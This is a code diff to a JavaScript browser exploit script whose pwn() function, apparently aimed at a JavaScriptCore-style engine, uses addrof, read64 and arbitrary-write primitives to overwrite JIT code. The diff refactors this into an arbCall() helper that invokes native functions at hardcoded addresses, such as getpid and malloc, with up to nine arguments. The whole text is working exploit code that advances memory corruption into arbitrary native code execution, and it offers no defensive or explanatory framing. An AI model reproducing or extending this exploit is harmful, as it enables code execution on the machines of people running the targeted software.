@@ -370,15 +370,12 @@ function pwn() {
         0x00, 0x00, 0x00, 0x00
     ]);
     
+    // initialize arb call
     let array = new Uint8Array(0x2345).fill(0);
     let arrayView = new DataView(array.buffer);
     let arrayAddr = read64(addrof(array) + 0x10);
     log(`[+] arrayAddr = 0x${arrayAddr.toString(16)}`);
-
-    let arbCallBytesView = new DataView(arbCallBytes.buffer);
-    arbCallBytesView.setBigUint64(0x48, BigInt(arrayAddr), true);
-
-
+    new DataView(arbCallBytes.buffer).setBigUint64(0x48, BigInt(arrayAddr), true);
     var shellcodeFuncAddr = addrof(shellcodeFunc);
     log(`[+] Shellcode function @ ${shellcodeFuncAddr.toString(16)}`);
     var executableAddr = read64(shellcodeFuncAddr + 24);
@@ -389,21 +386,27 @@ function pwn() {
     log(`[+] JITCode @ ${JITCode.toString(16)}`);
     ArbitraryWrite(JITCode, arbCallBytes);
     
-    // prep the args
-    // arrayView.setBigUint64(0x0, 0x1918c5280n, true); // malloc
-    arrayView.setBigUint64(0x0, 0x1babf715cn, true); // getpid
-   
-    for (let i = 0; i < 9; i++) {
-        let x = BigInt(i);
-        arrayView.setBigUint64(16 + (i * 8), x, true);
+    function arbCall(func, ...args) {
+        if (args.length > 9) {
+            log("[+] Only 9 args are allowed!\n");
+            return -1;
+        }
+        log(`[+] func: 0x${func.toString(16)}`);
+        arrayView.setBigUint64(0x0, BigInt(func), true);
+        for (let i = 0; i < args.length; i++) {
+            log(`[+] x${i}: 0x${args[i].toString(16)}`);
+            arrayView.setBigUint64(16 + (i * 8), BigInt(args[i]), true);
+        }
+        shellcodeFunc();
+        for (let i = 0; i < 9; i++) arrayView.setBigUint64(16 + (i * 8), 0n, true);
+        return arrayView.getBigUint64(0x8, true);
     }
-    arrayView.setBigUint64(16, 22n, true);
-    arrayView.setBigUint64(24, 0x1babf715cn, true);
-    arrayView.setBigUint64(32, BigInt(arrayAddr + 8), true);
     
-    // make the call
-    shellcodeFunc();
+    //arbCall(0x4142434445464748n, 0x41n, 0x42n, 0x43n, 0x44n, 0x45n, 0x46n, 0x47n, 0x48n, 0x49n);
     
-    let ret = arrayView.getBigUint64(0x8, true);
-    log(`[+] ret = 0x${ret.toString(16)}, ${ret}`);
+    let pid = arbCall(0x1babf715c); // getpid()
+    log(`[+] pid = ${pid}`);
+    
+    let ret = arbCall(0x1918c5280, 10); // malloc(10)
+    log(`[+] ret = 0x${ret.toString(16)}`);
 }
